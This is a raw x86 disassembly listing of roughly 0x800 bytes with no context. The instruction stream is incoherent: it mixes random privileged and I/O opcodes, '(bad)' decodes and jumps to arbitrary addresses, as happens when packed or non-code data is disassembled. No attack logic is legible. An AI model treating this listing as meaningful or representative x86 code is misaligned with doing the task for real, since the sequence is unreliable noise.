  4200e0:	dec    esi
  4200e1:	mov    eax,0x19fe005b
  4200e6:	scas   al,BYTE PTR es:[edi]
  4200e7:	rol    DWORD PTR [eax+ebx*1],cl
  4200ea:	out    dx,eax
  4200eb:	pop    edx
  4200ec:	jg     0x4200f8
  4200ee:	aad    0x95
  4200f0:	push   edx
  4200f1:	or     cl,bh
  4200f3:	push   es
  4200f4:	and    edx,DWORD PTR [edi-0x77f0add2]
  4200fa:	iret   
  4200fb:	into   
  4200fc:	ss sahf 
  4200fe:	mov    ebx,0x3108d33d
  420103:	lods   eax,DWORD PTR ds:[esi]
  420104:	repnz dec ecx
  420106:	loopne 0x4200d6
  420108:	xchg   ebx,eax
  420109:	js     0x42016e
  42010b:	sbb    DWORD PTR ds:0xb2c10d90,ebp
  420111:	dec    esi
  420112:	cmc    
  420113:	sub    eax,0xeae5a27c
  420118:	sub    eax,0xdc94115b
  42011d:	dec    ebx
  42011e:	out    0x5a,eax
  420120:	inc    esp
  420121:	retf   
  420122:	hlt    
  420123:	jne    0x420120
  420125:	add    BYTE PTR [edx+0x6ef58a0],0xff
  42012c:	loopne 0x42013b
  42012e:	sahf   
  42012f:	pop    ebp
  420130:	or     BYTE PTR [edi+0x2f],al
  420133:	mov    DWORD PTR [esi],0xea803d2e
  420139:	mov    bh,0xfe
  42013b:	iret   
  42013c:	jecxz  0x420101
  42013e:	arpl   WORD PTR [ebp-0x5750b0b8],dx
  420144:	inc    edi
  420145:	push   edx
  420146:	and    BYTE PTR [edx+0x1ff9b09c],dl
  42014c:	jg     0x420184
  42014e:	or     bl,BYTE PTR [esi+0x241f082f]
  420154:	call   0xdc696d10
  420159:	call   0xaad1:0x413481b5
  420160:	iret   
  420161:	and    WORD PTR [edi],bp
  420164:	or     al,BYTE PTR [ebx]
  420166:	push   cs
  420167:	jp     0x420172
  420169:	pop    ecx
  42016a:	cli    
  42016b:	jmp    0xd2f35f20
  420170:	dec    esp
  420171:	stos   BYTE PTR es:[edi],al
  420172:	or     DWORD PTR [esi-0x213694ed],eax
  420178:	pop    eax
  420179:	mov    bl,0x3b
  42017b:	and    eax,0x67eb426f
  420180:	popa   
  420181:	sbb    esi,edx
  420183:	das    
  420184:	cmp    edx,DWORD PTR [ecx+0x79]
  420187:	(bad)  
  420188:	adc    al,0x22
  42018a:	or     eax,0x7b5008f
  42018f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420190:	in     al,dx
  420191:	pop    ebx
  420192:	jne    0x420135
  420194:	test   BYTE PTR ds:0x802eed7e,dh
  42019a:	xor    DWORD PTR [eax+0x7f],esp
  42019d:	pop    ecx
  42019e:	icebp  
  42019f:	pop    edi
  4201a0:	mov    ebx,0x57ca07f0
  4201a5:	or     ch,BYTE PTR [esi+ebp*8-0x2a]
  4201a9:	inc    esi
  4201aa:	xor    DWORD PTR [edx+0x17],0xc25bb775
  4201b1:	mov    bl,ah
  4201b3:	pop    ss
  4201b4:	mov    dl,0xc9
  4201b6:	ror    dl,0x5b
  4201b9:	ror    bl,cl
  4201bb:	in     eax,0xb8
  4201bd:	lods   al,BYTE PTR ds:[esi]
  4201be:	out    0x96,eax
  4201c0:	sbb    DWORD PTR [edi+0x37],ebp
  4201c3:	adc    bh,BYTE PTR [eax+0x409369a3]
  4201c9:	lods   eax,DWORD PTR ds:[esi]
  4201ca:	jne    0x4201d3
  4201cc:	or     eax,0x163ac286
  4201d1:	jo     0x420187
  4201d3:	push   esp
  4201d4:	jle    0x42020f
  4201d6:	adc    eax,0x274a2e0
  4201db:	mov    dl,0xd0
  4201dd:	dec    ebx
  4201de:	add    al,0x18
  4201e0:	(bad)  
  4201e2:	jne    0x4201bf
  4201e4:	ins    BYTE PTR es:[edi],dx
  4201e5:	or     ch,BYTE PTR [esi-0x4]
  4201e8:	push   0x48b2efa9
  4201ed:	xchg   BYTE PTR [edi-0x41],al
  4201f0:	jns    0x420177
  4201f2:	adc    eax,esp
  4201f4:	clc    
  4201f5:	dec    ecx
  4201f6:	sbb    dl,0x3d
  4201f9:	fst    DWORD PTR [esi]
  4201fb:	pop    edx
  4201fc:	xor    ebp,DWORD PTR [edx-0x12]
  4201ff:	stos   DWORD PTR es:[edi],eax
  420200:	stos   BYTE PTR es:[edi],al
  420201:	push   0xffffffe1
  420203:	call   0x264a9bee
  420208:	je     0x420244
  42020a:	mov    al,ds:0xcce2101a
  42020f:	fcmovne st,st(1)
  420211:	dec    edx
  420212:	add    DWORD PTR [esi-0x2b],0xc994a2be
  420219:	dec    edi
  42021a:	ins    DWORD PTR es:[edi],dx
  42021b:	(bad)  
  42021c:	loopne 0x4201f2
  42021e:	fnstcw WORD PTR [ebp-0x3ce2f83f]
  420224:	cmp    BYTE PTR [esi+0x3078a523],cl
  42022a:	fstp   TBYTE PTR [ecx-0x48961c3d]
  420230:	push   DWORD PTR [ecx-0x30]
  420233:	scas   eax,DWORD PTR es:[edi]
  420234:	cwde   
  420235:	iret   
  420236:	jge    0x420206
  420238:	setp   dh
  42023b:	out    0x5,al
  42023d:	and    esi,eax
  42023f:	lods   al,BYTE PTR ds:[esi]
  420240:	out    dx,eax
  420241:	or     al,0x3e
  420243:	sahf   
  420244:	sbb    BYTE PTR [ecx-0x73],0xcd
  420248:	sub    esi,ebp
  42024a:	ret    0x9991
  42024d:	cs in  eax,0x79
  420250:	mov    bl,BYTE PTR [edi-0x58]
  420253:	es jns 0x4201fb
  420256:	int3   
  420257:	into   
  420258:	neg    DWORD PTR [ebx-0x6b]
  42025b:	in     eax,dx
  42025c:	xchg   ecx,eax
  42025d:	inc    eax
  42025e:	cmp    al,0xbb
  420260:	inc    edx
  420261:	sbb    ah,BYTE PTR [edx-0xd]
  420264:	mov    bl,bh
  420266:	sbb    DWORD PTR [esi+eax*8+0x22],ebp
  42026a:	retf   0x98a0
  42026d:	mov    DWORD PTR [esi-0x1d],eax
  420270:	or     eax,0x47acc9c3
  420275:	fdiv   DWORD PTR [edx]
  420277:	test   al,0x14
  420279:	fsubr  DWORD PTR [ebp-0x30b43e50]
  42027f:	std    
  420280:	out    0x6b,eax
  420282:	frstor [esp+eiz*8+0x3d]
  420286:	dec    edx
  420287:	push   0x28ba1da9
  42028c:	ja     0x4202f2
  42028e:	inc    esi
  42028f:	jmp    0xcb24:0x2e8975a
  420296:	pop    ebp
  420297:	(bad)  
  420298:	jns    0x4202b1
  42029a:	sub    ebx,edx
  42029c:	xchg   esi,eax
  42029d:	sub    esp,DWORD PTR [edi]
  42029f:	test   esp,edi
  4202a1:	nop
  4202a2:	les    esp,FWORD PTR [esi-0x6]
  4202a5:	pusha  
  4202a6:	sub    al,0x95
  4202a8:	sub    al,bl
  4202aa:	mov    edx,0x22b94f4e
  4202af:	ret    0x22b1
  4202b2:	sub    BYTE PTR [ebp+0xd],al
  4202b5:	in     al,0x87
  4202b7:	adc    dh,BYTE PTR [edi-0x32c35952]
  4202bd:	xor    dh,dh
  4202bf:	push   ebp
  4202c0:	int3   
  4202c1:	fist   DWORD PTR [edx]
  4202c3:	push   ecx
  4202c4:	pushf  
  4202c5:	mov    eax,0xeab70fcf
  4202ca:	mov    edx,0x403adc1d
  4202cf:	add    al,0x28
  4202d1:	mov    ah,0xd3
  4202d3:	neg    BYTE PTR [eax-0x42]
  4202d6:	cld    
  4202d7:	js     0x4202d0
  4202d9:	or     eax,esi
  4202db:	dec    esp
  4202dc:	xchg   ebx,edx
  4202de:	jl     0x420358
  4202e0:	inc    ecx
  4202e1:	sub    bl,ch
  4202e3:	cmc    
  4202e4:	ins    BYTE PTR es:[edi],dx
  4202e5:	lds    ecx,FWORD PTR [eax-0x4e5a66a4]
  4202eb:	sub    eax,0x657f4a9f
  4202f0:	push   ebp
  4202f1:	mov    al,ds:0xb3550616
  4202f6:	ror    BYTE PTR [edi+0x6259cb9b],1
  4202fc:	and    al,0x20
  4202fe:	sahf   
  4202ff:	mov    esp,0x5d8a144e
  420304:	loope  0x42029a
  420306:	jbe    0x42036a
  420308:	sbb    al,0xc4
  42030a:	shl    BYTE PTR [edx+esi*4-0x46],1
  42030e:	sub    DWORD PTR [ebx-0x24acda9e],edx
  420314:	(bad)  
  420315:	mov    ah,0x28
  420317:	fsubr  DWORD PTR [esi+0x46]
  42031a:	cmp    eax,0x5f6143c7
  42031f:	mov    al,0x38
  420321:	inc    eax
  420322:	clc    
  420323:	dec    ebx
  420324:	ins    DWORD PTR es:[edi],dx
  420325:	fld    TBYTE PTR [esp+edi*1]
  420328:	sahf   
  420329:	jnp    0x4202e5
  42032b:	jns    0x4202b4
  42032d:	cmp    al,BYTE PTR [eax-0x8]
  420330:	xchg   ecx,eax
  420331:	adc    DWORD PTR [edx-0x60743288],ecx
  420337:	adc    DWORD PTR [eax],eax
  420339:	pop    ds
  42033a:	add    al,0x26
  42033c:	add    al,0xfc
  42033e:	add    eax,0x54bdb3d
  420343:	sbb    BYTE PTR ds:0xd6b0b84,dh
  420349:	jge    0x4203b8
  42034b:	xchg   esi,eax
  42034c:	int3   
  42034d:	out    dx,al
  42034e:	or     esi,ebp
  420350:	je     0x420352
  420352:	out    0xa3,al
  420354:	mov    ecx,0x5d776271
  420359:	dec    ebx
  42035a:	shl    BYTE PTR [ebx+0x527a04a1],cl
  420360:	stc    
  420361:	mov    al,ds:0xc447e0dd
  420366:	or     ecx,DWORD PTR [esi+0x58]
  420369:	sub    al,0xa5
  42036b:	inc    esp
  42036c:	(bad)  [edi]
  42036e:	sub    BYTE PTR [ebp-0x2d],ah
  420371:	in     al,dx
  420372:	(bad)  
  420373:	mov    esi,0x7023335c
  420378:	mov    dh,bh
  42037a:	push   es
  42037b:	or     eax,0x9c72c00a
  420380:	and    dh,0xc5
  420383:	loope  0x4203a9
  420385:	pop    edx
  420387:	sub    eax,0xcc54aeb4
  42038c:	mov    esi,0x13700e81
  420391:	lods   eax,DWORD PTR ds:[esi]
  420392:	xchg   edi,eax
  420393:	pop    ds
  420394:	xor    BYTE PTR [ebx],0xe1
  420397:	mov    bl,0xbe
  420399:	mov    edx,0x6f9b28fc
  42039e:	dec    esp
  42039f:	and    esp,DWORD PTR [esi]
  4203a1:	iret   
  4203a2:	scas   eax,DWORD PTR es:[edi]
  4203a3:	push   esp
  4203a4:	fmul   DWORD PTR [ecx]
  4203a6:	mov    ds:0x9ace871b,al
  4203ab:	(bad)  
  4203ac:	ja     0x4203b6
  4203ae:	lods   eax,DWORD PTR ds:[esi]
  4203af:	inc    esp
  4203b0:	mov    ebx,0x98c1cb01
  4203b5:	pop    edx
  4203b6:	dec    ecx
  4203b7:	adc    eax,0xd6f08082
  4203bc:	das    
  4203bd:	inc    ebx
  4203be:	xor    bh,ah
  4203c0:	popa   
  4203c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203c2:	mov    cl,0x91
  4203c4:	ss jp  0x420408
  4203c7:	mov    edx,0x90f1f458
  4203cc:	ins    BYTE PTR es:[edi],dx
  4203cd:	clc    
  4203ce:	push   0x9ec1218c
  4203d3:	jle    0x420371
  4203d5:	(bad)  
  4203d6:	dec    edi
  4203d7:	popf   
  4203d8:	mov    cl,BYTE PTR [eax-0x27]
  4203db:	sbb    BYTE PTR [edx+0x5109b54d],cl
  4203e1:	call   0x6dd7:0x8ab0b4eb
  4203e8:	lods   al,BYTE PTR ds:[esi]
  4203e9:	xchg   esi,eax
  4203ea:	jns    0x420460
  4203ec:	mov    edi,0xe350c159
  4203f1:	fmulp  st(3),st
  4203f3:	into   
  4203f4:	jp     0x420412
  4203f6:	jge    0x420412
  4203f8:	push   cs
  4203f9:	and    dl,BYTE PTR [eax+ebx*8-0x7f4a3bb0]
  420400:	in     eax,0x3c
  420402:	sub    DWORD PTR [ecx+0xb],esi
  420405:	inc    ebx
  420406:	mov    ebp,DWORD PTR [edx-0x68]
  420409:	adc    eax,0x6537a8d
  42040e:	retf   
  42040f:	aam    0x10
  420411:	push   0xcc5acbf6
  420416:	(bad)  
  420417:	adc    bh,bh
  420419:	sbb    DWORD PTR [edx+0x2a8b7a36],esi
  42041f:	jecxz  0x4203a1
  420421:	out    0x3b,al
  420423:	iret   
  420424:	or     ebx,DWORD PTR [esi]
  420426:	outs   dx,BYTE PTR ds:[esi]
  420427:	mov    edi,0x9eb4d37e
  42042c:	(bad)  
  42042d:	out    0x5d,eax
  42042f:	xor    al,BYTE PTR [ecx+0x37a993d7]
  420435:	sub    esp,edi
  420437:	rcl    ebp,0x85
  42043a:	adc    al,0x7d
  42043c:	pop    es
  42043d:	push   ebx
  42043e:	sbb    esi,esi
  420440:	stos   DWORD PTR es:[edi],eax
  420441:	push   cs
  420442:	mov    ch,0x3f
  420444:	or     BYTE PTR [ebp-0x17],0xdb
  420448:	mov    dl,0xcf
  42044a:	nop
  42044b:	and    al,0xd9
  42044d:	mov    ebx,0xaf649032
  420452:	retf   0xc3f0
  420455:	push   es
  420456:	(bad)  
  420457:	popw   ds
  420459:	cdq    
  42045a:	lea    esi,[ebx+0x4]
  42045d:	cmp    BYTE PTR [edx],dl
  42045f:	out    0x70,al
  420461:	(bad)
  420464:	fstp   DWORD PTR [edi]
  420466:	pop    eax
  420467:	fsubr  st(5),st
  420469:	(bad)  
  42046a:	xor    bl,BYTE PTR [ecx+0x18e21677]
  420470:	ds mov ds,esi
  420473:	dec    esp
  420474:	int    0x1a
  420476:	cmp    al,0xf1
  420478:	out    dx,eax
  420479:	jb     0x420475
  42047b:	push   0xfffffff9
  42047d:	mov    edx,0xe4dc9e8a
  420482:	aas    
  420483:	in     eax,dx
  420484:	jnp    0x4204bf
  420486:	neg    DWORD PTR [ebp+0x37421e5a]
  42048c:	and    al,BYTE PTR [ecx]
  42048e:	mov    ds:0xdb96d3f8,eax
  420493:	xchg   BYTE PTR [ebp+0xb],dl
  420496:	jl     0x42047a
  420498:	xchg   edi,eax
  420499:	inc    ebp
  42049a:	lods   al,BYTE PTR ds:[esi]
  42049b:	jns    0x42049f
  42049d:	test   eax,0x9b01749f
  4204a2:	ins    DWORD PTR es:[edi],dx
  4204a3:	fldcw  WORD PTR gs:[edi-0x60a4cfcf]
  4204aa:	ds aad 0xc0
  4204ad:	push   cs
  4204ae:	and    eax,0x119554d3
  4204b3:	and    al,0xa8
  4204b5:	dec    esi
  4204b6:	sti    
  4204b7:	adc    BYTE PTR [ecx-0x80],cl
  4204ba:	cmp    bl,BYTE PTR [ebx+edx*2-0x7de6b090]
  4204c1:	ror    BYTE PTR [ebp-0x6925467c],1
  4204c7:	call   0x68bc26d1
  4204cc:	inc    edi
  4204cd:	jb     0x420518
  4204cf:	pop    esp
  4204d0:	pop    edx
  4204d1:	mov    eax,ds:0xb391d0c3
  4204d6:	sub    bh,BYTE PTR [edi+0x52]
  4204d9:	out    dx,eax
  4204da:	pop    ecx
  4204db:	shl    BYTE PTR [edi],0x1c
  4204de:	jne    0x420549
  4204e0:	adc    bh,BYTE PTR [esi]
  4204e2:	cmp    bh,BYTE PTR [ecx+0x46]
  4204e5:	pop    es
  4204e6:	inc    esi
  4204e7:	cli    
  4204e8:	ret    0xb42f
  4204eb:	xor    eax,DWORD PTR [ebp+ecx*8-0x5a727232]
  4204f2:	in     eax,0x9e
  4204f4:	push   ebp
  4204f5:	sbb    DWORD PTR [edi-0xbc2db55],edx
  4204fb:	push   ebp
  4204fc:	and    al,0xc0
  4204fe:	or     edi,DWORD PTR [edi]
  420500:	(bad)  
  420501:	repz and al,0x25
  420504:	pop    ecx
  420505:	add    edi,esp
  420507:	(bad)  
  420508:	loopne 0x42049b
  42050a:	mov    ch,0x99
  42050c:	mov    edx,0xc134d715
  420511:	xchg   dl,dl
  420513:	and    BYTE PTR [ecx],cl
  420515:	stos   DWORD PTR es:[edi],eax
  420516:	nop
  420517:	push   ecx
  420518:	jae    0x4204c2
  42051a:	mov    ebx,DWORD PTR [eax+0x2bf219c9]
  420520:	ret    
  420521:	scas   al,BYTE PTR es:[edi]
  420522:	test   DWORD PTR [eax-0x3a1ce218],0xe6161640
  42052c:	int    0x8b
  42052e:	xchg   ecx,eax
  42052f:	cmp    edi,DWORD PTR [edi-0x2a5fc341]
  420535:	shl    BYTE PTR ds:0x4f6e3100,cl
  42053b:	or     al,0xb8
  42053d:	cli    
  42053e:	inc    ebp
  42053f:	adc    bh,BYTE PTR [ecx]
  420541:	mov    dh,0xc1
  420543:	xor    ah,dh
  420545:	dec    ebx
  420546:	xor    ah,al
  420548:	pusha  
  420549:	sub    BYTE PTR [ebp+0x3e9a17c5],0x83
  420550:	daa    
  420551:	dec    ebp
  420552:	xchg   ecx,eax
  420553:	hlt    
  420554:	mov    al,0x32
  420556:	dec    esp
  420557:	inc    esp
  420558:	out    0xa5,eax
  42055a:	test   eax,0xd2f1b558
  42055f:	imul   esi,edx,0x59
  420562:	or     DWORD PTR [edi+0x6f],0x6a
  420566:	inc    ebx
  420567:	arpl   WORD PTR [esp+esi*2-0x52],cx
  42056b:	mov    BYTE PTR [ebx-0x1b288d16],bl
  420571:	test   DWORD PTR [edx-0x36],ebx
  420574:	jnp    0x42056c
  420576:	retf   
  420577:	out    dx,al
  420578:	test   edi,edi
  42057a:	and    DWORD PTR [eax],esi
  42057c:	and    al,cl
  42057e:	mov    ah,0xdf
  420580:	scas   al,BYTE PTR es:[edi]
  420581:	sar    BYTE PTR [ecx+0x6e],cl
  420584:	stos   BYTE PTR es:[edi],al
  420585:	stos   BYTE PTR es:[edi],al
  420586:	out    dx,al
  420587:	dec    ebx
  420588:	jl     0x420538
  42058a:	frstor [ebp+ecx*2-0x5971193e]
  420591:	lds    ecx,FWORD PTR [edi]
  420593:	jno    0x420594
  420595:	test   eax,0xfcc982fc
  42059a:	lahf   
  42059b:	jae    0x420566
  42059d:	xor    DWORD PTR [edi+edx*1],eax
  4205a0:	ror    DWORD PTR [ebx],1
  4205a2:	inc    edi
  4205a3:	iret   
  4205a4:	cmp    cl,BYTE PTR [eax]
  4205a6:	xor    DWORD PTR [ebp+0x3f],0x43
  4205aa:	std    
  4205ab:	fcmovne st,st(2)
  4205ad:	pop    esi
  4205ae:	cmp    DWORD PTR [eax+0x18],esi
  4205b1:	add    al,0x8e
  4205b3:	(bad)
  4205b8:	xchg   edi,eax
  4205b9:	xchg   edi,eax
  4205ba:	or     eax,0xefd01d06
  4205bf:	mov    eax,ds:0x843f5827
  4205c4:	push   eax
  4205c5:	into   
  4205c6:	or     BYTE PTR [edx-0x62],0x1b
  4205ca:	outs   dx,DWORD PTR ds:[esi]
  4205cb:	iret   
  4205cc:	lea    esp,[eax-0x6e]
  4205cf:	add    al,0xf
  4205d1:	mov    ch,0x17
  4205d3:	dec    esi
  4205d4:	mov    dl,0x5b
  4205d6:	std    
  4205d7:	into   
  4205d8:	pushf  
  4205d9:	mov    edx,0x4050daa4
  4205de:	sbb    al,0x8b
  4205e1:	(bad)  
  4205e2:	test   eax,0x1b983326
  4205e7:	mov    ah,0xab
  4205e9:	mov    ch,0x79
  4205eb:	or     bl,dl
  4205ed:	mov    DWORD PTR [ecx],esi
  4205ef:	ror    ebp,0x24
  4205f2:	scas   al,BYTE PTR es:[edi]
  4205f3:	and    eax,0x321b87b3
  4205f8:	retf   0x3c53
  4205fb:	popf   
  4205fc:	push   ebp
  4205fd:	sub    BYTE PTR [ecx-0x339a880],ah
  420603:	stc    
  420604:	add    eax,0xe8f374d
  420609:	repnz stos DWORD PTR es:[edi],eax
  42060b:	arpl   WORD PTR ss:[edi-0xa],ax
  42060f:	cli    
  420610:	mov    ch,0x2d
  420612:	or     DWORD PTR [eax],esi
  420614:	mov    dh,0xfc
  420616:	je     0x420693
  420618:	adc    esp,DWORD PTR [edi+0x22]
  42061b:	xor    eax,0x287e511c
  420620:	xchg   edi,eax
  420621:	ret    0xae07
  420624:	and    edi,DWORD PTR [eax]
  420626:	jns    0x420693
  420628:	icebp  
  420629:	aam    0xa
  42062b:	add    eax,0xf4ccc89c
  420630:	(bad)  
  420631:	or     al,0xb8
  420633:	lea    eax,[eax]
  420635:	cdq    
  420636:	pop    ds
  420637:	sbb    al,0xe0
  420639:	cmp    DWORD PTR [esi],esi
  42063b:	repnz cli 
  42063d:	pop    ss
  42063e:	cwde   
  42063f:	scas   eax,DWORD PTR es:[edi]
  420640:	push   ds
  420641:	(bad)  
  420642:	pushf  
  420643:	inc    eax
  420644:	adc    eax,0x38e18409
  420649:	gs push 0x15
  42064c:	(bad)  
  42064d:	shr    BYTE PTR [ebp+0x3ec86962],cl
  420653:	mov    esi,0xf2b58d19
  420658:	xor    DWORD PTR [ecx+0x75],esi
  42065b:	popf   
  42065c:	ror    ch,cl
  42065e:	lds    eax,FWORD PTR ss:[eax]
  420661:	add    BYTE PTR [eax],al
  420663:	add    BYTE PTR [eax],al
  420665:	add    BYTE PTR ds:0x55d31474,ah
  42066b:	repz out 0xf6,eax
  42066e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42066f:	adc    bh,BYTE PTR [esi]
  420671:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420672:	jo     0x420680
  420674:	mov    ds:0x1fed1a2,al
  420679:	add    BYTE PTR [esi],bl
  42067b:	pop    es
  42067c:	add    BYTE PTR [eax],al
  42067e:	fldcw  WORD PTR [esi-0x4c]
  420681:	add    BYTE PTR [edx-0x48725dc6],dh
  420687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420688:	std    
  420689:	mov    BYTE PTR [ebp+0x25],cl
  42068c:	fild   WORD PTR [edx+ebx*2+0x5c565305]
  420693:	inc    ebx
  420694:	cmp    eax,0x9fbf07a0
  420699:	mov    ds:0x6a8c28fb,eax
  42069e:	xor    ebp,0xffffffe6
  4206a1:	paddusw mm4,mm4
  4206a4:	aam    0x9c
  4206a6:	popa   
  4206a7:	mov    esi,gs
  4206a9:	dec    edx
  4206aa:	and    al,0xc7
  4206ac:	mov    eax,ds:0x68761e77
  4206b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206b2:	inc    edi
  4206b3:	cs addr16 inc edx
  4206b6:	aad    0x9f
  4206b8:	pop    ecx
  4206b9:	or     BYTE PTR [ebx+0x64],ch
  4206bc:	in     eax,dx
  4206bd:	and    BYTE PTR [esp+edi*1-0x1d],ah
  4206c1:	jbe    0x42068b
  4206c3:	dec    ebx
  4206c4:	addr16 (bad) 
  4206c7:	out    dx,al
  4206c8:	and    DWORD PTR [ebp+0x6e2a4fee],esi
  4206ce:	mov    esp,0x610c751b
  4206d3:	adc    edx,DWORD PTR [eax-0x8]
  4206d6:	repz or al,ch
  4206d9:	mov    edx,0x9046c8b3
  4206de:	push   ebx
  4206df:	mov    BYTE PTR [ebx+0x3fb512a6],dl
  4206e5:	fwait
  4206e6:	add    eax,0xbb826c3c
  4206eb:	in     al,dx
  4206ec:	dec    edx
  4206ed:	mov    dh,0x3b
  4206ef:	inc    esp
  4206f0:	in     eax,0x99
  4206f2:	mov    bl,0x71
  4206f4:	rcr    DWORD PTR [edi],1
  4206f6:	and    ah,BYTE PTR [esi*8-0x3f2d2a3d]
  4206fd:	inc    edi
  4206fe:	nop    ebx
  420701:	pushw  0x15
  420704:	push   ebp
  420705:	int    0x18
  420707:	cmp    cl,al
  420709:	repz push esi
  42070b:	lods   eax,DWORD PTR ds:[esi]
  42070c:	sub    dl,BYTE PTR [esi]
  42070e:	or     dh,BYTE PTR [ecx+0x13a8bc7f]
  420714:	test   BYTE PTR [ecx+0x32],ah
  420717:	data16 fimul WORD PTR [eax]
  42071a:	stos   DWORD PTR es:[edi],eax
  42071b:	xchg   ebx,eax
  42071c:	adc    BYTE PTR [ebx+0x27],dh
  42071f:	retf   0x90c7
  420722:	je     0x420740
  420724:	nop
  420725:	push   esp
  420726:	mov    edx,0xbfd9b45
  42072b:	cmc    
  42072c:	pop    esp
  42072d:	leave  
  42072e:	jp     0x420731
  420730:	outs   dx,BYTE PTR ds:[esi]
  420731:	mov    bl,0x7c
  420733:	jg     0x420710
  420735:	xor    edi,0x15
  420738:	int    0x1b
  42073a:	mov    al,0x95
  42073c:	xor    eax,0x5d87c0fa
  420741:	lods   al,BYTE PTR ds:[esi]
  420742:	test   dh,0x2a
  420745:	push   ebx
  420746:	fs xchg ecx,eax
  420748:	gs popf 
  42074a:	jbe    0x4207ab
  42074c:	sub    eax,0x8860470d
  420751:	test   eax,0x7c003530
  420756:	lods   al,BYTE PTR ds:[esi]
  420757:	cld    
  420758:	xchg   ecx,eax
  420759:	push   0xffffffa3
  42075b:	add    eax,0x218fece8
  420760:	xor    esp,DWORD PTR [ecx-0x58]
  420763:	adc    dh,BYTE PTR [esi+ebx*8]
  420766:	sub    al,0x57
  420768:	loopne 0x4207d5
  42076a:	jp     0x420786
  42076c:	outs   dx,DWORD PTR ds:[esi]
  42076d:	push   0x9b451258
  420772:	mov    dl,0xf7
  420774:	pop    ss
  420775:	jb     0x4207c5
  420777:	cdq    
  420778:	mov    ah,0xdc
  42077a:	jp     0x420783
  42077c:	cli    
  42077d:	pop    esi
  42077e:	xchg   esi,eax
  42077f:	push   esi
  420780:	rcr    DWORD PTR [edi-0x4f022866],1
  420786:	popa   
  420787:	add    ch,dh
  420789:	stos   DWORD PTR es:[edi],eax
  42078a:	pop    esp
  42078b:	and    BYTE PTR [edi-0x66aa36bd],bh
  420791:	push   ebp
  420792:	fimul  WORD PTR [esi+0x67]
  420795:	popa   
  420796:	iret   
  420797:	push   eax
  420798:	dec    esp
  420799:	xchg   DWORD PTR [ebp+eiz*1+0x2711bba5],esp
  4207a0:	cdq    
  4207a1:	pop    edi
  4207a2:	nop
  4207a3:	cmp    eax,0x2c034f85
  4207a8:	jo     0x42074e
  4207aa:	gs rcr esp,1
  4207ad:	sub    al,ch
  4207af:	xchg   ebp,eax
  4207b0:	and    ecx,DWORD PTR [edi-0x20]
  4207b3:	mov    al,0xc4
  4207b5:	outs   dx,DWORD PTR ds:[esi]
  4207b6:	mov    ecx,0x8ddab7b9
  4207bb:	and    esp,DWORD PTR [ebp-0x47]
  4207be:	aad    0x8b
  4207c0:	sbb    ch,BYTE PTR ds:0x3c85993b
  4207c6:	and    esi,esi
  4207c8:	inc    esp
  4207c9:	jnp    0x4207d0
  4207cb:	xchg   esp,eax
  4207cc:	mov    bl,0x68
  4207ce:	test   edx,ecx
  4207d0:	data16 int 0xf0
  4207d3:	mov    ah,0xe8
  4207d5:	xor    BYTE PTR [ebp+0x5b089c],cl
  4207db:	jbe    0x42078a
  4207dd:	and    BYTE PTR [eax+0x5af474a4],bl
  4207e3:	mov    al,0x4e
  4207e5:	lahf   
  4207e6:	mov    al,ds:0xa5a6286b
  4207eb:	push   ebx
  4207ec:	mov    ecx,0xfa6db87a
  4207f1:	cmc    
  4207f2:	bound  edx,QWORD PTR [edx+0x5d]
  4207f5:	data16 mov ds:0x5eb5792a,al
  4207fb:	cmp    DWORD PTR [eax],edx
  4207fd:	push   ds
  4207fe:	std    
  4207ff:	cmp    eax,0xcb865e56
  420804:	add    bh,BYTE PTR [ebp+ecx*2+0x19194f06]
  42080b:	xchg   edx,eax
  42080c:	pop    ds
  42080d:	and    al,0xf1
  42080f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420810:	jg     0x4207b9
  420812:	mov    cl,0x58
  420814:	jbe    0x420821
  420816:	mov    esi,0xe1d8018e
  42081b:	mov    DWORD PTR [ebp+edx*1+0x18],0xd5283090
  420823:	sti    
  420824:	fs or  eax,0x9649aeb4
  42082a:	mov    BYTE PTR [edx+0x7a3a8eb5],bh
  420830:	(bad)
  420833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420834:	dec    ebx
  420835:	or     ch,BYTE PTR [ecx+0x73120095]
  42083b:	adc    al,0x5d
  42083d:	std    
  42083e:	int    0xf5
  420840:	popf   
  420841:	sbb    bl,BYTE PTR [ebx]
  420843:	push   0x1
  420845:	nop
  420846:	inc    ecx
  420847:	xlat   BYTE PTR ds:[ebx]
  420848:	xchg   ebx,eax
  420849:	add    DWORD PTR [ebp+0x2001e213],edx
  42084f:	jns    0x420895
  420851:	nop
  420852:	xchg   BYTE PTR [esp+edi*1],al
  420855:	sbb    al,0x23
  420857:	pop    edi
  420858:	ret    0xed56
  42085b:	push   esp
  42085c:	sub    al,0xd6
  42085e:	cmc    
  42085f:	gs (bad) 
  420861:	fdivr  QWORD PTR [edx]
  420863:	or     BYTE PTR [ecx+edx*2-0xf327244],al
  42086a:	adc    ch,BYTE PTR [eax+0x2a143761]
  420870:	rcl    BYTE PTR [esi-0x4a7ec4e],1
  420876:	or     ah,al
  420878:	mov    edi,DWORD PTR [ebp+eax*1-0x79bff46b]
  42087f:	mov    edi,0x3fe02165
  420884:	pop    ebp
  420885:	cs pop ebp
  420887:	push   0xdac5a2f1
  42088c:	sahf   
  42088d:	inc    esp
  42088e:	out    dx,al
  42088f:	mov    ah,0x2b
  420891:	push   0x20
  420893:	push   esp
  420894:	lods   al,BYTE PTR ds:[esi]
  420895:	xchg   edi,eax
  420896:	dec    esi
  420897:	or     dh,BYTE PTR ds:0xb4131de1
  42089d:	and    dl,BYTE PTR [ebx]
  42089f:	test   eax,0xed846d6d
  4208a4:	das    
  4208a5:	popa   
  4208a6:	adc    edi,DWORD PTR [eax-0x66]
  4208a9:	xchg   edi,eax
  4208aa:	push   ebx
  4208ab:	mov    esp,0x85cddd52
  4208b0:	xchg   ebx,eax
  4208b1:	sahf   
  4208b2:	popa   
  4208b3:	pop    ecx
  4208b4:	add    ch,BYTE PTR [ecx+0x26]
  4208b7:	or     DWORD PTR [ebx+0x1d3107f6],edx
  4208bd:	jmp    0x5fa6:0xb7cff913
  4208c4:	call   0x4e97:0xc3066846
  4208cb:	sbb    ecx,DWORD PTR [eax-0x2]
